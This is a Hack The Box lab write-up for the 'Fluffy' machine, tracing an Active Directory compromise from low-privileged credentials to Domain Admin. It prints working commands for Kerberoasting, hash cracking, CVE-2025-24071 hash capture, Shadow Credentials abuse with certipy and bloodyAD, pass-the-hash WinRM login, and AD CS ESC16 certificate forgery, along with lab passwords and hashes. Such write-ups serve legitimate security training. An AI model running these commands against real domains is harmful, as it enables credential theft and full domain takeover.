---
title: HTB Fluffy
slug: fluffy
lang: en
platform: Hack The Box
category: Active Directory
headline: CVE-2025-24071 hash leak, Shadow Credentials and AD CS ESC16
difficulty: Medium
objective: Domain Admin
date: 2025-10-31
tags: [Active Directory, Kerberoasting, Shadow Credentials, AD CS, ESC16]
---

# HTB Fluffy

## Executive Summary

Fluffy starts with valid low-privileged domain credentials. Kerberoasting does not immediately yield usable passwords, so the path pivots to SMB share enumeration. A document inside the `IT` share references CVE-2025-24071, which is abused to coerce an outbound SMB authentication and capture the NetNTLMv2 hash for `p.agila`. After cracking the hash, group abuse and Shadow Credentials provide access to service accounts. The final step abuses AD CS ESC16 by manipulating the UPN of `ca_svc`, requesting a certificate as Administrator and authenticating with the issued PFX.

## Initial Enumeration

```text
j.fleischman / J0elTHEM4n1990!
```

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.28.13 -oG allPorts
nxc smb 10.129.28.13 -u j.fleischman -p 'J0elTHEM4n1990!'
```

![[Pasted image 20251030194309.png|Initial port scan]]
![[Pasted image 20260506120547.png|Domain controller time synchronization]]

Kerberoasting identified service accounts, but cracking was not successful.

```bash
nxc ldap 10.129.28.13 -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt
hashcat fluffy.krb /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

BloodHound and RustHound data were collected to understand privilege paths.

![[Pasted image 20260506120652.png|BloodHound collection]]
![[Pasted image 20251031034326.png|Initial BloodHound review]]

## SMB Share and CVE-2025-24071

The `IT` share contained `Upgrade_Notice.pdf`, which referenced potentially exploitable CVEs.

```bash
smbclient -U j.fleischman -L //fluffy.htb
```

![[Pasted image 20260506120751.png|SMB share permissions]]
![[Pasted image 20260506120954.png|IT share with Upgrade Notice]]
![[Pasted image 20251031043207.png|Upgrade Notice download]]
![[Pasted image 20251031043348.png|CVE references in PDF]]

CVE-2025-24071 was used to force SMB authentication through a malicious `.library-ms` payload inside a ZIP archive.

![[Pasted image 20251031044029.png|CVE-2025-24071 technical note]]
![[Pasted image 20260506121036.png|CVE-2025-24071 PoC]]
![[Pasted image 20260506121118.png|Responder listener]]
![[Pasted image 20260506121210.png|ZIP payload uploaded to SMB]]
![[Pasted image 20260506121331.png|p.agila NetNTLMv2 captured]]

The hash was cracked as `p.agila:prometheusx-303`.

![[Pasted image 20260506121419.png|Hash cracking attempt]]
![[Pasted image 20251031045518.png|p.agila password recovered]]

## Shadow Credentials and Service Accounts

BloodHound showed that `p.agila` could reach service accounts through group membership abuse.

![[Pasted image 20251031045813.png|p.agila marked as owned]]
![[Pasted image 20251031050250.png|Service account manager relationship]]
![[Pasted image 20251031050452.png|Service accounts outgoing controls]]
![[Pasted image 20251031051000.png|p.agila credential validation]]
![[Pasted image 20251031051501.png|Shortest path to winrm_svc]]

The user was added to `service accounts` and Shadow Credentials were abused against `winrm_svc` and `ca_svc`.

```bash
bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host 10.129.243.25 add groupMember 'service accounts' p.agila
certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc
certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account ca_svc
```

![[Pasted image 20260506121513.png|p.agila added to service accounts]]
![[Pasted image 20260506121549.png|Shadow credentials on winrm_svc]]
![[Pasted image 20260506121732.png|Shadow credentials on ca_svc]]

WinRM access was obtained as `winrm_svc`.

```bash
evil-winrm -i 10.129.243.25 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

![[Pasted image 20260506121800.png|WinRM access as winrm_svc]]

## AD CS ESC16

Certificate enumeration with `ca_svc` showed an ESC16 path.

```bash
certipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.243.25 -vulnerable
```

![[Pasted image 20251031053809.png|ca_svc certificate access]]
![[Pasted image 20260506121904.png|Certipy vulnerable templates]]
![[Pasted image 20260506121948.png|ESC16 reference]]
![[Pasted image 20260506122012.png|Current account details]]

The `ca_svc` UPN was modified to request a certificate as Administrator, then restored.

```bash
certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.243.25 -user ca_svc -upn administrator update
certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.129.243.25
certipy auth -dc-ip 10.129.243.25 -pfx administrator.pfx -username administrator -domain fluffy.htb
```

![[Pasted image 20260506122048.png|UPN update]]
![[Pasted image 20260506122114.png|Administrator UPN update]]
![[Pasted image 20260506122144.png|Certificate request]]
![[Pasted image 20260506122209.png|UPN restored]]
![[Pasted image 20260506122231.png|Administrator certificate authentication]]
![[Pasted image 20260506122304.png|Administrator WinRM access]]

## Key Takeaways

- Failed Kerberoasting does not end an AD attack path; SMB and document exposure can provide alternatives.
- Forced authentication bugs can bridge file access into credential capture.
- Shadow Credentials are stealthy because they avoid direct password resets.
- ESC16 can turn service account control into full domain compromise.
